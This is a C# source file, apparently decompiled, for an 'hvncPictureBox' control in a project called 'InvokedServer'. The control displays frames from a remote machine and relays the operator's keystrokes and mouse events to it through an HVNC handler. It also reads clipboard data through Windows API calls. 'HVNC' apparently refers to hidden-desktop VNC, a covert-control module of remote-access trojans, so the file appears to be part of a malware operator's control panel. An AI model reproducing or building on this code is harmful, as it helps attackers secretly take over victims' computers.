

using InvokedServer.Messages;
using InvokedServer.Utilities;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace InvokedServer.Controls
{
	public class hvncPictureBox : PictureBox, IhvncPictureBox
	{
		public HVNCHandler _HVNCHandler;
		private readonly object _imageLock = new object();
		private Stopwatch _sWatch;
		private Stopwatch _sFrameCapWatch;
		private const float TargetFrameTime = 0.001667f;
		public FrameCounter _frameCounter;
		public const uint CF_TEXT = 1;
		public const uint CF_BITMAP = 2;
		public const uint CF_UNICODETEXT = 13;
		public const uint CF_HDROP = 15;

		public bool Running { get; set; }

		public bool CapFPS { get; set; }

		public int ScreenWidth { get; private set; }

		public int ScreenHeight { get; private set; }

		public bool _enableMouseInput { get; set; }

		public bool _enableKeyboardInput { get; set; }

		public Image GetImageSafe
		{
			get => this.Image;
			set
			{
				lock (this._imageLock)
					this.Image = value;
			}
		}

		public void SetFrameUpdatedEvent(FrameUpdatedEventHandler e)
		{
			this._frameCounter.FrameUpdated += e;
		}

		public void UnsetFrameUpdatedEvent(FrameUpdatedEventHandler e)
		{
			this._frameCounter.FrameUpdated -= e;
		}

		public void Start()
		{
			this._frameCounter = new FrameCounter();
			this._sWatch = Stopwatch.StartNew();
			this._sFrameCapWatch = Stopwatch.StartNew();
			this.CapFPS = true;
			this.Running = true;
		}

		public void Stop()
		{
			this._sWatch?.Stop();
			this._sFrameCapWatch?.Stop();
			this.Running = false;
		}

		public void UpdateImage(Bitmap bmp, bool cloneBitmap)
		{
			if (this.CapFPS)
			{
				if (!this.CheckAgainstFPScap())
					return;
			}
			else if (this._sFrameCapWatch.IsRunning)
				this._sFrameCapWatch.Stop();
			try
			{
				this.CountFps();
				if (this.ScreenWidth != bmp.Width && this.ScreenHeight != bmp.Height)
					this.UpdateScreenSize(bmp.Width, bmp.Height);
				lock (this._imageLock)
				{
					Image getImageSafe = this.GetImageSafe;
					this.SuspendLayout();
					this.GetImageSafe = cloneBitmap ? (Image)new Bitmap((Image)bmp, this.Width, this.Height) : (Image)bmp;
					this.ResumeLayout();
					getImageSafe?.Dispose();
				}
			}
			catch (InvalidOperationException)
			{
			}
			catch
			{
			}
		}

		public hvncPictureBox()
		{
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
		}

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ExStyle |= 33554432;
				return createParams;
			}
		}

		protected override void OnPaint(PaintEventArgs pe)
		{
			lock (this._imageLock)
			{
				if (this.GetImageSafe == null)
					return;
				pe.Graphics.DrawImage(this.GetImageSafe, new Point(0, 0));
			}
		}

		private void UpdateScreenSize(int newWidth, int newHeight)
		{
			this.ScreenWidth = newWidth;
			this.ScreenHeight = newHeight;
		}

		private bool CheckAgainstFPScap()
		{
			if (this._sFrameCapWatch.Elapsed.TotalSeconds < 0.0016670000040903687)
				return false;
			this._sFrameCapWatch = Stopwatch.StartNew();
			return true;
		}

		private void CountFps()
		{
			float totalSeconds = (float)this._sWatch.Elapsed.TotalSeconds;
			this._sWatch = Stopwatch.StartNew();
			this._frameCounter.Update(totalSeconds);
		}

		public void SetHandler(HVNCHandler handler) => this._HVNCHandler = handler;

		public void SetMouseInput(bool val) => this._enableMouseInput = val;

		public void SetKeyboardInput(bool val) => this._enableKeyboardInput = val;

		[DllImport("user32.dll")]
		public static extern short GetKeyState(int nVirtKey);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsClipboardFormatAvailable(uint format);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool OpenClipboard(IntPtr hWndNewOwner);

		[DllImport("user32.dll")]
		public static extern IntPtr GetClipboardData(uint uFormat);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CloseClipboard();

		[DllImport("user32.dll")]
		private static extern short VkKeyScan(char c);

		[DllImport("user32.dll")]
		public static extern int ToAscii(
		  uint uVirtKey,
		  uint uScanCode,
		  byte[] lpKeyState,
		  out uint lpChar,
		  uint uFlags);

		public Point TranslateCoordinates(
		  Point originalCoords,
		  Size originalScreenSize,
		  PictureBox targetControl)
		{
			float num1 = (float)targetControl.Image.Width / (float)originalScreenSize.Width;
			float num2 = (float)targetControl.Image.Height / (float)originalScreenSize.Height;
			int x = (int)((double)originalCoords.X * (double)num1);
			int y = (int)((double)originalCoords.Y * (double)num2);
			return this.UnzoomedAndAdjusted(targetControl, new Point(x, y));
		}

		public static void GetClipboardFormat()
		{
			if (!hvncPictureBox.OpenClipboard(IntPtr.Zero))
				return;
			if (hvncPictureBox.IsClipboardFormatAvailable(1U))
			{
				IntPtr clipboardData = hvncPictureBox.GetClipboardData(1U);
				Marshal.PtrToStringUni(clipboardData);
				Marshal.FreeHGlobal(clipboardData);
			}
			else if (hvncPictureBox.IsClipboardFormatAvailable(2U))
			{
				IntPtr clipboardData = hvncPictureBox.GetClipboardData(2U);
				Image.FromHbitmap(clipboardData);
				Marshal.FreeHGlobal(clipboardData);
			}
			else if (hvncPictureBox.IsClipboardFormatAvailable(13U))
			{
				IntPtr clipboardData = hvncPictureBox.GetClipboardData(13U);
				Marshal.PtrToStringUni(clipboardData);
				Marshal.FreeHGlobal(clipboardData);
			}
			hvncPictureBox.CloseClipboard();
		}

		private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
		{
			Size clientSize = pictureBox.ClientSize;
			double val1 = (double)clientSize.Width / (double)pictureBox.Image.Width;
			clientSize = pictureBox.ClientSize;
			double val2 = (double)clientSize.Height / (double)pictureBox.Image.Height;
			float num = Math.Min((float)val1, (float)val2);
			Rectangle displayRectangle = this.GetImageDisplayRectangle(pictureBox);
			return new Point((int)((double)(scaledPoint.X - displayRectangle.X) / (double)num), (int)((double)(scaledPoint.Y - displayRectangle.Y) / (double)num));
		}

		private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
		{
			if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
				return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
			if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
				return pictureBox.ClientRectangle;
			float num1 = Math.Min((float)pictureBox.ClientSize.Width / (float)pictureBox.Image.Width, (float)pictureBox.ClientSize.Height / (float)pictureBox.Image.Height);
			int num2 = (int)((double)pictureBox.Image.Width * (double)num1);
			int num3 = (int)((double)pictureBox.Image.Height * (double)num1);
			Size clientSize = pictureBox.ClientSize;
			int x = (clientSize.Width - num2) / 2;
			clientSize = pictureBox.ClientSize;
			int y = (clientSize.Height - num3) / 2;
			int width = num2;
			int height = num3;
			return new Rectangle(x, y, width, height);
		}

		public static char GetModifiedKey(char c)
		{
			short num1 = hvncPictureBox.VkKeyScan(c);
			if (num1 == (short)-1)
				return c;
			uint num2 = (uint)num1 & (uint)byte.MaxValue;
			byte[] lpKeyState = new byte[256];
			lpKeyState[16] = (byte)128;
			uint lpChar;
			return 1 != hvncPictureBox.ToAscii(num2, num2, lpKeyState, out lpChar, 0U) ? c : (char)lpChar;
		}

		public static bool IsAlphaNumeric(char c)
		{
			if (c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z')
				return true;
			return c >= '1' && c <= '9';
		}

		public void TriggerWndProc(ref Message m) => this.WndProc(ref m);

		protected override void WndProc(ref Message m)
		{
			if (this.Image == null)
			{
				base.WndProc(ref m);
			}
			else
			{
				switch (m.Msg)
				{
					case 256:
					case 257:
						if (this._enableKeyboardInput)
						{
							try
							{
								uint msg = (uint)m.Msg;
								IntPtr wParam = m.WParam;
								IntPtr lparam = m.LParam;
								bool flag1 = ((uint)hvncPictureBox.GetKeyState(16) & 32768U) > 0U;
								bool flag2 = Control.IsKeyLocked(Keys.Capital);
								if (flag1 | flag2)
								{
									if (wParam.ToInt32() != 16)
									{
										if (wParam.ToInt32() != 20)
										{
											if (flag1)
											{
												msg = 258U;
												uint uScanCode = (uint)(lparam.ToInt32() >> 16 & (int)byte.MaxValue);
												byte[] lpKeyState = new byte[256];
												uint lpChar;
												hvncPictureBox.ToAscii((uint)wParam.ToInt32(), uScanCode, lpKeyState, out lpChar, 0U);
												wParam = (IntPtr)Convert.ToInt32(hvncPictureBox.GetModifiedKey((char)lpChar));
											}
											if (flag2)
											{
												uint uScanCode = (uint)(lparam.ToInt32() >> 16 & (int)byte.MaxValue);
												byte[] lpKeyState = new byte[256];
												uint lpChar;
												hvncPictureBox.ToAscii((uint)wParam.ToInt32(), uScanCode, lpKeyState, out lpChar, 0U);
												if (hvncPictureBox.IsAlphaNumeric((char)lpChar))
													msg = 258U;
											}
										}
										else
											break;
									}
									else
										break;
								}
								this._HVNCHandler.SendInputEvent((int)msg, (long)(int)wParam, (long)(int)lparam);
								break;
							}
							catch
							{
								break;
							}
						}
						else
							break;
					case 512:
					case 513:
					case 514:
					case 515:
					case 516:
					case 517:
					case 518:
					case 519:
					case 520:
					case 521:
						if (this._enableMouseInput)
						{
							try
							{
								int num1 = m.LParam.ToInt32() & 65535;
								int num2 = m.LParam.ToInt32() >> 16 & 65535;
								int num3 = num1 * this._HVNCHandler._codec.Resolution.Width;
								Size localResolution = this._HVNCHandler.LocalResolution;
								int width = localResolution.Width;
								int x1 = num3 / width;
								int num4 = num2 * this._HVNCHandler._codec.Resolution.Height;
								localResolution = this._HVNCHandler.LocalResolution;
								int height = localResolution.Height;
								int y1 = num4 / height;
								Point point = this.TranslateCoordinates(new Point(x1, y1), this.Image.Size, (PictureBox)this);
								int x2 = point.X;
								int y2 = point.Y;
								m.LParam = (IntPtr)(y2 << 16 | x2 & 65535);
								this._HVNCHandler.SendInputEvent(m.Msg, (long)(int)m.WParam, (long)(int)m.LParam);
								break;
							}
							catch
							{
								break;
							}
						}
						else
							break;
					case 522:
						if (this._enableMouseInput)
						{
							try
							{
								this._HVNCHandler.SendInputEvent(m.Msg, (long)m.WParam, (long)m.LParam);
								break;
							}
							catch
							{
								break;
							}
						}
						else
							break;
				}
				base.WndProc(ref m);
			}
		}
	}
}